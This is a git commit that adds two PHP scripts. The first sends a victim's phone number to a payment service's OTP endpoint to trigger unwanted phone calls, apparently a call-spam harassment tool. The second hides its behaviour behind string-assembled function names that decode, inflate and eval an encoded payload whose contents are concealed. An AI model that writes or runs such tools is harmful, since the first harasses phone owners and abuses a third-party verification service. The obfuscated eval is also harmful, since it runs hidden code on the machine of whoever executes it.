65b3af876d520d19ef61a364724a41f94bacafe8
★Indonesia Security Lite★ <18ilhammahmud81@gmail.com>
2019-01-26 05:30:46 +0700

    Add files via upload

---
+++ 4.php
@@ -0,0 +1,19 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "COPYRIGHT ; SGBTEAM\n\n";
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
---
+++ 6.php
@@ -0,0 +1,11 @@
+<?php
+/***
+
+Proxy     : 152.240.3.32
+Port      : 80
+Code Play : Chandra Aditya
+GitHub    : https://github.com/Aditya021/
+Update    : 13-January-2019
+
+***/
+$ndVPL='d';$wtRvP='c';$QJNBA='l';$HaPW='t';$gyuL='4';$rvGUH='f';$cHZIH='6';$kwv='b';$hbh='v';$xnd='n';$d='g';$Mn='_';$o='i';$uq='z';$aoe='r';$HfL='e';$WAoSs='o';$JeMRb='s';$wGAqR='a';$eyMX=$JeMRb.$HaPW.$aoe.$aoe.$HfL.$hbh;$kQ=$d.$uq.$o.$xnd.$rvGUH.$QJNBA.$wGAqR.$HaPW.$HfL;$SyUa=$kwv.$wGAqR.$JeMRb.$HfL.$cHZIH.$gyuL.$Mn.$ndVPL.$HfL.$wtRvP.$WAoSs.$ndVPL.$HfL;eval($kQ($eyMX($SyUa('H9KdZwW2K/7VmbaAG09iP8V+K6hdeMyoWXbemAivKlUf17TWyFnwLyK2xiIdhDXZYMDTB5vSB/ubDhLda7HwHVvJxmEv1sp3yrT9rSPtjHK65Q0o8LaU3Lqm/39Wo2H4RPw83rVTTEl0LOqGCIWxdz6DfBg3aLA0cafiUpglJrxZd0BCbsEl3QaANfMLqJYuglSJmGhw+iawA/vysI8bfmGL8zNYB+D9+gL1v/HFITk/dsv4Bv+WsngGf0WHgBj49zeZAvZJfkAL2EOr3IEV/ChMwwAqzuGJbklyeCiMgBV3kR2B5fORHIDmcHiBQA+87EijpaAjdbCR42YbvSqRv3GeO9glGG/alSmMI05wnPK/NtUg+hfoXKSApx3QT1N+C1Liv8xFmfBj0HmCJLRoHykilU5IMs6hyclq1GsQESdhwKT88C2CTpfbppc+2yiHiEVEco5mggXjlptiSSdSf0Gk2T25KrRKxEamGQnF3rnZo+jIpwGWT2l5dqndZvccxMFr3pq1r+yzNbpoGM9xw2u42gnBq5gKN3OsgmlNShtSk7aUxhGML9TDLTzi8Ys3VWegxvvOQK+mtjJ4Jf1CrMNzrI+pqaOZnTGmW+l6WulvsRWST5FgvgJ1UKvmuwVXXbq71UeZzB+qZCTYa3V8CcVwHXR3RViK9/f3qqaFDjjLa/D/G1MnjBzM7oVcoyxhBxoIY2ujLFnGbPIqzv0SzgicDGVLgTuU24CI3MMAzDRgqkNm8yDSe6aj481HR+fMnKpuZtQ5jvS5IKqTRZSA7tBJ5hPqJZayIokDaCsWUQkHB5iWre2nBmUFvXazLkCIIsF+BWWR75Wb5Qq4010SY5chCJrhwFmJ3FYtLDLhZ6c6z2Zh7MMf/MzC+u1Imk4kDsGDvd9VWpOLEFgTeOsNaFTVabsCT63Uk2ojscVIkh8BxWBfIRin66+GEECbbtuVtQ=='))));
